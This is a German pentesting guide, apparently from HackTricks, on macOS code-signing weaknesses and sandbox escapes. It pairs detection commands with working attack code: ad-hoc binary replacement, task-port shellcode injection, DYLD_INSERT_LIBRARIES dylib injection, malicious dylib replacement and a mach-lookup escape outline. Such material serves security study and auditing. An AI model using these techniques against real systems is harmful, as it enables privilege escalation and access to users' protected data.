# Schwachstellen bei der macOS-Code-Signierung & Sandbox-Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-hoc-signierte Binaries

### Grundlegende Informationen

**Ad-hoc-Signierung** (`CS_ADHOC`) erstellt eine Codesignatur mit **keiner Zertifikatskette** — sie ist ein Hash des Codes ohne Überprüfung der Entwickleridentität. Die Herkunft des Binaries kann keinem Entwickler oder keiner Organisation zugeordnet werden.<sup>[[1]](#references)[[4]](#references)</sup>

Auf Apple-Silicon-Macs benötigen alle ausführbaren Dateien mindestens eine Ad-hoc-Signatur. Daher findet man Ad-hoc-Signaturen bei vielen Entwicklungstools, Homebrew-Paketen und Dienstprogrammen von Drittanbietern.

### Warum das wichtig ist

- **Keine überprüfbare Identität** — das Binary kann ersetzt werden, ohne dass dies durch identitätsbasierte Prüfungen erkannt wird
- Ad-hoc-Binaries von Drittanbietern an **privilegierten Stellen** (FDA, Daemons, Helfer) sind besonders attraktive Ziele
- In einigen Konfigurationen werden Ad-hoc-Signaturen möglicherweise **nicht so strikt verifiziert** wie Code mit Entwickler-Signatur
- Ad-hoc-signierte Binaries mit **TCC-Berechtigungen** sind besonders wertvoll — die Berechtigungen bleiben bestehen, selbst wenn sich der Binary-Inhalt ändert (abhängig davon, wie TCC die Berechtigung zugeordnet hat)

### Entdeckung
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Angriff: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Debugbare Prozesse (get-task-allow)

### Grundlegende Informationen

Die **`com.apple.security.get-task-allow`**-Berechtigung (oder das **`CS_GET_TASK_ALLOW`**-Flag) erlaubt es **jedem Prozess, sich als Debugger anzuhängen**, den Speicher zu lesen, Register zu ändern, Code zu injizieren und die Ausführung zu steuern.<sup>[[3]](#references)</sup>

Dies ist **nur für Entwicklungs-Builds** vorgesehen. Einige Binaries von Drittanbietern werden jedoch mit dieser Berechtigung in der Produktion ausgeliefert.

> [!CAUTION]
> Ein Produktions-Binary mit `get-task-allow` ist ein **sofort nutzbarer Exploit-Primitiv**. Jeder lokale Prozess kann `task_for_pid()` aufrufen, den Mach-Task-Port des Ziels erhalten und beliebigen Code injizieren, der mit den Berechtigungen, TCC-Freigaben und dem Sicherheitskontext des Ziels ausgeführt wird.

### Erkennung
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Angriff: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Keine Library-Validierung + DYLD-Umgebung

### Aufhebung der Library-Validierung zur Laufzeit

Das private Entitlement **`com.apple.private.security.clear-library-validation`** deaktiviert die Library-Validierung nicht beim Prozessstart. Stattdessen erlaubt es dem Prozess, zur Laufzeit `csops(..., CS_OPS_CLEAR_LV, ...)` auf sich selbst aufzurufen. XNU entfernt anschließend `CS_REQUIRE_LV | CS_FORCED_LV`, sofern der Aufrufer über das Entitlement verfügt und die zusätzlichen Prüfungen des Handlers erfüllt. Folglich kann ein Prozess erst dann zu einem geeigneten Ziel für Library-Injection werden, wenn er den Codepfad erreicht, der die Library-Validierung aufhebt.<sup>[[4]](#references)[[5]](#references)</sup>

### Die gefährliche Kombination

Wenn ein Binary **beide** folgenden Entitlements besitzt:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (lädt beliebige dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (akzeptiert DYLD-Umgebungsvariablen)

Dies ist ein **garantiertes Code-Injection-Primitiv** — `DYLD_INSERT_LIBRARIES` funktioniert einwandfrei.

### Erkennung
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Angriff: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Temporäre Sandbox-Ausnahmen

### Wie sie die Sandbox schwächen

Temporäre Sandbox-Ausnahmen (`com.apple.security.temporary-exception.*`) reißen Lücken in die App Sandbox:<sup>[[2]](#references)</sup>

| Ausnahme | Was sie ermöglicht |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Verbindung zu systemweiten XPC/Mach-Diensten |
| `temporary-exception.files.absolute-path.read-write` | Lesen/Schreiben von Dateien außerhalb des App-Containers |
| `temporary-exception.iokit-user-client-class` | Öffnen von IOKit-User-Client-Verbindungen |
| `temporary-exception.shared-preference.read-only` | Lesen der Einstellungen anderer Apps |
| `temporary-exception.files.home-relative-path.read-write` | Zugriff auf Pfade relativ zu `~` |

### Mach-Lookup-Ausnahmen = Primitive für Sandbox-Escapes

Die gefährlichste Ausnahme ist **mach-lookup** – sie ermöglicht es einer sandboxed App, mit privilegierten Daemons zu kommunizieren:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Angriff: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple-Entitlements

### Was sie sind

Entitlements mit dem Präfix `com.apple.private.*` ermöglichen den Zugriff auf **interne Apple-APIs**, die nicht dokumentiert sind oder Drittentwicklern nicht zur Verfügung stehen. Binaries von Drittanbietern mit privaten Entitlements erhielten diese über Enterprise-Zertifikate, MDM oder die Verteilung außerhalb des App Store.

### Gefährliche private Entitlements

| Entitlement | Fähigkeit |
|---|---|
| `com.apple.private.tcc.manager` | Vollständiger Lese-/Schreibzugriff auf die TCC-Datenbank |
| `com.apple.private.tcc.allow` | Zugriff auf bestimmte TCC-Dienste |
| `com.apple.private.security.no-sandbox` | Ausführung ohne Sandbox |
| `com.apple.private.iokit` | Direkter Zugriff auf IOKit-Treiber |
| `com.apple.private.kernel.\*` | Zugriff auf Kernel-Schnittstellen |
| `com.apple.private.xpc.launchd.job-label` | launchd-Jobs registrieren/verwalten |
| `com.apple.rootless.install` | In SIP-geschützte Pfade schreiben |

### Entdeckung
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Benutzerdefinierte Sandbox-Profile

### Was sie sind

Binärdateien können **benutzerdefinierte Sandbox-Profile** enthalten, die in SBPL (Seatbelt Profile Language) geschrieben sind. Diese Profile können restriktiver ODER **freizügiger** als die standardmäßige App Sandbox sein.

### Überprüfung benutzerdefinierter Profile
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Beschreibbare Bibliothekspfade

### Was sie sind

Wenn eine Binärdatei eine dynamische Bibliothek aus einem Pfad lädt, in den der aktuelle Benutzer **schreiben** kann, kann die Bibliothek durch bösartigen Code ersetzt werden.

### Ermittlung
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Angriff: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Leitfaden zur Code-Signierung](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*`-Operationen und `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (Handler für `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
